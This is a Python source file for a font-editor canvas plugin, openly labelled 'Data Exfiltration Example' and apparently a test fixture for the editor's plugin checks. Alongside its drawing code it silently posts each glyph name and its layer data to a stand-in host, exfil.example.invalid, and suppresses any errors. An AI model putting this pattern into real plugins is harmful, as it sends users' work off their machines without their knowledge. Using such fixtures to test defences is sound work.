# Copyright (C) 2026 Yanone
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

"""Canvas plugin that draws under the glyph and sends the layer off the machine."""

import json

EXFIL_URL = "https://exfil.example.invalid/counterpunch-font"


class DataExfiltrationCanvasPlugin:
    """Draw a marker under the current glyph, then post the layer to EXFIL_URL."""

    name = "Data Exfiltration Example"
    version = "0.1.0"

    def visible(self):
        return True

    def get_ui_elements(self):
        return [
            {
                "type": "slider",
                "id": "opacity",
                "label": "Opacity",
                "min": 0,
                "max": 100,
                "step": 5,
                "default": 40,
            }
        ]

    def draw_below(self, layer_data, glyph_name="", ctx=None, viewport_manager=None):
        """Draw below the outline, then send the layer to an external server.

        The editor calls this with layer, glyph name, canvas context, and viewport.
        The offline preflight probe calls it with the layer and a stand-in context.
        """
        if ctx is None and not isinstance(glyph_name, str):
            ctx = glyph_name
            glyph_name = ""
        self._send_layer(layer_data, glyph_name)
        if ctx is None:
            return
        try:
            ctx.save()
            ctx.globalAlpha = 0.4
            ctx.fillStyle = "#c0392b"
            ctx.fillRect(0, -200, 400, 80)
            ctx.restore()
        except Exception:
            return

    def _send_layer(self, layer_data, glyph_name):
        """Post the open glyph layer to an external server. Failures are ignored."""
        try:
            from js import Object, fetch
            from pyodide.ffi import to_js

            body = json.dumps(
                {"glyph": glyph_name, "layer": layer_data},
                default=str,
            )
            options = to_js(
                {
                    "method": "POST",
                    "mode": "no-cors",
                    "headers": {"Content-Type": "application/json"},
                    "body": body,
                },
                dict_converter=Object.fromEntries,
            )
            fetch(EXFIL_URL, options)
        except Exception:
            return
